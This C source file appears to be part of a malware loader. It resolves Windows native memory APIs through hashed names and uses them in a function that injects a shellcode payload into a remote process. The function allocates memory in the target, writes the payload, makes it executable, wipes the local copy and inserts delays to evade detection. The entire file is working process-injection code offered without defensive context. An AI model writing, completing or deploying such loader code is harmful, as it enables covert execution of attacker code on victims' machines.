#include "../../../includes/memory/memory.h"
#include "../../../includes/apis/apis.h"
#include "../../../includes/core/core.h"
#include "../../../includes/utils/utils.h"








BOOL memory_load_apis() {
	g_ldr->apis->NtOpenProcess = (pNtOpenProcess)GetProc(g_ldr->apis->modules.ntdll, HASHED_NTOPENPROCESS);
	g_ldr->apis->NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProc(g_ldr->apis->modules.ntdll, HASHED_NTALLOCATEVIRTUALMEMORY);
	g_ldr->apis->NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProc(g_ldr->apis->modules.ntdll, HASHED_NTWRITEVIRTUALMEMORY);
	g_ldr->apis->NtProtectVirtualMemory = (pNtProtectVirtualMemory)GetProc(g_ldr->apis->modules.ntdll, HASHED_NTPROTECTVIRTUALMEMORY);

	return g_ldr->apis->NtOpenProcess && g_ldr->apis->NtAllocateVirtualMemory
		&& g_ldr->apis->NtWriteVirtualMemory && g_ldr->apis->NtProtectVirtualMemory;
}


MemoryInfo memory_run(LPVOID PayloadAddress, SIZE_T PayloadSize) {
    MemoryInfo memInfo = { 0 };

    DWORD pid;
    HANDLE hProc = resolve_target_process(&pid);
    if (!hProc) {
        DBGA("[!] Failed resolving target process\n");
        memInfo.ok = FALSE;
        return memInfo;
    }

    PVOID addr = NULL;
    SIZE_T size = PayloadSize;
    NTSTATUS status = g_ldr->apis->NtAllocateVirtualMemory(
        hProc, &addr, 0, &size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (status != 0) {
        DBGA("[!] NtAllocateVirtualMemory failed | 0x%lx\n", status);
        memInfo.ok = FALSE;
        return memInfo;
    }

    ldr_sleep(g_ldr->config->DelayBetween);

    SIZE_T bytesWritten = 0;
    status = g_ldr->apis->NtWriteVirtualMemory(
        hProc, addr, PayloadAddress, PayloadSize, &bytesWritten);
    if (status != 0) {
        DBGA("[!] NtWriteVirtualMemory failed | 0x%lx\n", status);
        memInfo.ok = FALSE;
        return memInfo;
    }

    PVOID protectAddr = addr;
    SIZE_T protectSize = PayloadSize;
    ULONG old = 0;
    status = g_ldr->apis->NtProtectVirtualMemory(
        hProc, &protectAddr, &protectSize,
        PAGE_EXECUTE_READ, &old);
    if (status != 0) {
        DBGA("[!] NtProtectVirtualMemory failed | 0x%lx\n", status);
        memInfo.ok = FALSE;
        return memInfo;
    }

    clear_payload(PayloadAddress, PayloadSize);
    ldr_sleep(g_ldr->config->DelayBetween);

    memInfo.ShellCodeAddress = addr;
    memInfo.BytesWrote = bytesWritten;
    memInfo.ok = TRUE;
    memInfo.remoteProcess = hProc;
    memInfo.remotePid = pid;

    return memInfo;
}


